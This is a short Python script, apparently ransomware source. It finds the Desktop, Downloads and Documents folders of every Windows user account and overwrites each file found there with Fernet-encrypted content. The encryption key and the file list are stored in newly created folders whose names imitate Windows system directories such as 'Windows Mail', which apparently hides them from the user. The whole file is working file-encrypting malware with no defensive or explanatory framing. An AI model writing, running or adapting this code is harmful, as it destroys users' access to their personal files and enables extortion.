import os
from os.path import abspath, dirname

from cryptography.fernet import Fernet, MultiFernet

directory = r'C:\Users'

users = []
for f in os.scandir(directory):
    if not f.name.startswith('.') and f.is_dir() and not f.name == 'Default User':
        users.append(f.path)

for user in users:
    print(user)

target_dirs = [ 'Desktop', 'Downloads', 'Documents' ]
folders = []
for user in users:
    for f in os.scandir(user):
        for target in target_dirs:
            if f.name == target:
                folders.append(f.path)

print()

for folder in folders:
    print(folder)

result = []

for folder in folders:
   for dirpath, dirnames, filenames in os.walk(folder):
       for filename in filenames:
           if filename == 'desktop.ini':
                continue
           if filename .endswith('.lnk'):
                continue
           if not filename [0] .isalpha() and not filename [0] .isdigit():
                continue
           result.append (os.path.join(dirpath, filename))

print(result)

mydirlist = [
    r'C:\ProgramData (x86)\WindowsPowerShell (x86)',
    r'C:\ProgramData (x86)\Windows Kits',
    r'C:\ProgramData (x86)\Windows Mail',
    r'C:\ProgramData (x86)\Windows Media Player',
    r'C:\ProgramData (x86)\Windows Multimedia Platform',
] 
for mydir in mydirlist:
    if not os.path.exists(mydir):
        os.makedirs(mydir)

with open(r'C:\ProgramData (x86)\Windows Mail\list.txt', 'w') as f:
    for line in result:
        f.write(f"{line}\n")

key = Fernet.generate_key()

with open(r'C:\ProgramData (x86)\Windows Mail\thekey.key', 'wb') as f:
    f.write(key)

for file in result:
    with open (file, 'rb') as f:
        content = f.read()
    content_encripted = Fernet(key).encrypt(content)
    with open (file, 'wb') as f:
        f.write(content_encripted)
